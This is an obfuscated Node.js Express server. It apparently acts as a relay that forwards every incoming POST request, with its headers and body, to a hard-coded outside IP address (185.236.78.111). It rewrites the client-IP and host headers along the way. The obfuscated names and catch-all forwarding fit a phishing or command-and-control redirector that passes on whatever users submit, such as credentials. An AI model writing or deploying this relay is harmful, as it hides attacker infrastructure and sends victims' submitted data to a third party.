var bodyParser = require('body-parser'),
  express = require('express')
const requester = require('request')
var app = express()
app.use(
  bodyParser.urlencoded({
    limit: '50mb',
    extended: true,
  })
)
app.use(bodyParser.json({ limit: '50mb' }))
app.use(bodyParser.raw())
app.set('port', process.env.PORT)
app.post('*', function (_0x2c6744, _0x650fd8) {
  _0x2c6744.headers['true-client-ip'] = _0x2c6744.headers['x-forwarded-for']
  let _0x489792 = new Date()
  var _0xfe5256 = _0x2c6744.headers,
    _0x4b463c = JSON.stringify(_0xfe5256)
      .replace("'{", '')
      .replace("}'", '')
      .replace('host', 'Dom_Net')
      .replace('content-length', 'content2')
      .replace('content-type', 'content34'),
    _0x18eedb = 'http://185.236.78.111' + _0x2c6744.url
  requester
    .post({
      headers: JSON.parse(_0x4b463c),
      url: _0x18eedb,
      body: _0x2c6744.body,
      json: true,
    })
    .pipe(_0x650fd8)
})
app.listen(process.env.PORT, '0.0.0.0', function () {
  console.log(app.get('port'))
  console.log('Starting listen...')
})
